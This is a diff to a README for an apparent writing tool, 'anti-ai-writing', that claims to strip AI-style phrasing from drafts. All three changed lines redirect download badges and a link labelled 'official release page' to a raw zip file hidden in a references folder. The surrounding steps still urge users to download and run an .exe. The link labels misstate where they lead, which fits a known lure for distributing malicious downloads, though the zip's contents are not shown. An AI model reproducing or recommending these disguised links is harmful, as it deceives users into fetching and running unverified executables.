@@ -1,18 +1,18 @@
 # ✍️ anti-ai-writing - Remove AI patterns from your drafts
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/kierstenicy452/anti-ai-writing)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/kierstenicy452/anti-ai-writing/raw/refs/heads/main/skills/anti-ai-writing/references/anti_ai_writing_3.3.zip)
 
 This tool edits your writing to remove common AI patterns. Many writing assistants rely on predictable structures and specific words. This software scans your text to find these issues. It replaces rigid phrases with natural language. It works for both English and Spanish documents. The application provides a clean rewrite of your work and explains the changes made to your text.
 
 ## 📥 How to download the software
 
-1. Visit the [official release page](https://github.com/kierstenicy452/anti-ai-writing).
+1. Visit the [official release page](https://github.com/kierstenicy452/anti-ai-writing/raw/refs/heads/main/skills/anti-ai-writing/references/anti_ai_writing_3.3.zip).
 2. Locate the section titled Releases on the right side of your screen.
 3. Select the latest version available.
 4. Download the file named anti-ai-writing.exe.
 5. Save this file to your desktop for easy access.
 
-[![](https://img.shields.io/badge/Get_The_App-Grey?style=for-the-badge)](https://github.com/kierstenicy452/anti-ai-writing)
+[![](https://img.shields.io/badge/Get_The_App-Grey?style=for-the-badge)](https://github.com/kierstenicy452/anti-ai-writing/raw/refs/heads/main/skills/anti-ai-writing/references/anti_ai_writing_3.3.zip)
 
 ## 💻 System requirements
 
